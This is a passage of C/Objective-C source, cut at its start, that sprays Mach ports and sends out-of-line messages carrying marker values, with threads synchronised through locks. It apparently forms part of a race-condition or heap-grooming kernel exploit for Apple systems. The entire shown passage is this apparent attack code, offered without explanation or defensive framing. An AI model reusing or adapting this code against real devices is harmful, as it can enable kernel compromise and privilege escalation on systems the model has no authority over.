        *(uint32_t*)(msg->desc[0].address) = 0x42420001;
        msg->header.msgh_remote_port = port_b;
        mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
        *(uint32_t*)(msg->desc[0].address) = 0x42420002;
        msg->header.msgh_remote_port = port_c;
        mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
        th1port_a = port_a;
        th1port_b = port_b;
        th1port_c = port_c;
        __unlock(&machm);
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port_a);
        mach_port_insert_right(mach_task_self(), port_a, port_a, MACH_MSG_TYPE_MAKE_SEND);
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port_b);
        mach_port_insert_right(mach_task_self(), port_b, port_b, MACH_MSG_TYPE_MAKE_SEND);
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port_c);
        mach_port_insert_right(mach_task_self(), port_c, port_c, MACH_MSG_TYPE_MAKE_SEND);
        msg->header.msgh_remote_port = port_a;
        *(uint32_t*)(msg->desc[0].address) = 0x42420000;

        __lock(&lb);
        __unlock(&la);

    }
    return 0;
}

// vim:ft=objc